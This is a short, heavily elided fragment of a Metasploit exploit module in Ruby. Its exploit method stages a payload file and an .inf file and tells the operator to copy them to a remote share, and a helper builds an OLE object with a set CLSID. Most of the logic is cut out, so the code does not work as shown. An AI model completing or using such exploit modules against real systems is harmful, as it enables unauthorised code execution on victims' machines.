...
class MetasploitModule < Msf::Exploit::Remote
  ...
  def exploit
    ...
    print_good("#{payload_name} stored at #{payload_path}, 
        copy it to the remote share: #{@unc}")

    inf_path = my_file_create(inf, inf_name)
    print_good("#{inf_name} stored at #{inf_path},
          copy it to the remote share: #{@unc}")
  end
  ...
  def create_ole(stream_name, data)
    ...
    directory.each_entry do |entry|
      if entry.instance_variable_get(:@_ab) == 'Root Entry'
        ...
        clsid = Rex::OLE::CLSID.new("\x02\x26\x02\x00\x00\x00
                      \x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46")
